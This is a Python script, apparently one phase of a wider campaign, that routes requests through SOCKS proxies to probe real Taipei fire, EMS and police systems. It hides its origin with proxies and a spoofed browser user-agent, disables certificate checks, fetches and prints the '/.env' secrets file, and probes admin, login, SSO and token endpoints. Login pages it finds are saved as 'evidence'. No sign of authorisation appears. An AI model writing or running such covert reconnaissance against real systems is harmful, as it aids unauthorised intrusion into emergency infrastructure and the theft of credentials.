#!/usr/bin/env python3
"""Phase 18: Re-probe FSM + EPCR via new proxy 202.160.76.154:11085"""
import requests, urllib3, re, json, time
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

HEADERS = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"}

PROXIES_LIST = [
    {"https": "socks5h://202.160.76.154:11085"},
    {"https": "socks5h://202.160.76.155:11084"},
]

TARGETS = {
    "fsm.119.gov.taipei": [
        "/w/fsm119/index", "/.env", "/login", "/admin/login",
        "/auth/genToken", "/auth/fetchServerData", "/oauth/token",
        "/sso/login", "/cas/login", "/api/getUserToken",
        "/user/login", "/citizen/auth/genToken",
    ],
    "epcr.tpf.gov.tw": ["/", "/login", "/api/login", "/admin"],
    "118.163.107.93": [
        "https://118.163.107.93:4000/",
        "https://118.163.107.93:4001/",
        "https://118.163.107.93:4002/",
    ],
    "mer2.tpf.gov.tw": ["/", "/login"],
    "taipeiciiis.119.gov.taipei": ["/", "/login", "/admin"],
    "taipeiciiis-dt.119.gov.taipei": ["/", "/login"],
}

results = {}
for proxy in PROXIES_LIST:
    print(f"=== Testing proxy: {proxy} ===")
    try:
        test = requests.get("https://fsm.119.gov.taipei/w/fsm119/index", proxies=proxy, headers=HEADERS, verify=False, timeout=15)
        print(f"  fsm.119.gov.taipei: {test.status_code}, len={len(test.text)}")
        results[str(proxy)] = {"fsm_status": test.status_code, "fsm_len": len(test.text)}
        
        # Get login page
        t = re.search(r'<title[^>]*>(.*?)</title>', test.text, re.I | re.S)
        print(f"  Title: {t.group(1).strip() if t else 'N/A'}")
        
        # Get .env
        r2 = requests.get("https://fsm.119.gov.taipei/.env", proxies=proxy, headers=HEADERS, verify=False, timeout=15)
        print(f"  .env: {r2.status_code}, len={len(r2.text)}")
        print(f"  .env content: {r2.text[:300]}")
        
        # Probe all target paths
        for host, paths in TARGETS.items():
            if host == "118.163.107.93":
                for url in paths:
                    try:
                        r = requests.get(url, proxies=proxy, headers=HEADERS, verify=False, timeout=10)
                        print(f"  {url}: {r.status_code}, len={len(r.text)}")
                        if r.status_code == 200 and len(r.text) > 500:
                            with open(f"tpe119_evidence/login_pages/fsm_{url.split('/')[-1] or 'root'}.html", "w") as f:
                                f.write(r.text[:10000])
                    except Exception as e:
                        print(f"  {url}: ERROR {str(e)[:80]}")
            else:
                for path in paths:
                    url = f"https://{host}{path}"
                    try:
                        r = requests.get(url, proxies=proxy, headers=HEADERS, verify=False, timeout=10)
                        print(f"  {host}{path}: {r.status_code}, len={len(r.text)}")
                        if r.status_code == 200:
                            t3 = re.search(r'<title[^>]*>(.*?)</title>', r.text, re.I | re.S)
                            title = t3.group(1).strip() if t3 else ""
                            if "form" in r.text.lower() or "password" in r.text.lower():
                                with open(f"tpe119_evidence/login_pages/{host.replace('.','_')}_{path.replace('/','_')}.html", "w") as f:
                                    f.write(r.text[:10000])
                                print(f"    -> Login page saved! Title: {title[:60]}")
                    except Exception as e:
                        print(f"  {host}{path}: ERROR {str(e)[:80]}")
        break
    except Exception as e:
        print(f"  Proxy failed: {str(e)[:100]}")
        continue

with open("tpe119_evidence/phase18_proxy_results.txt", "w") as f:
    f.write(str(results))
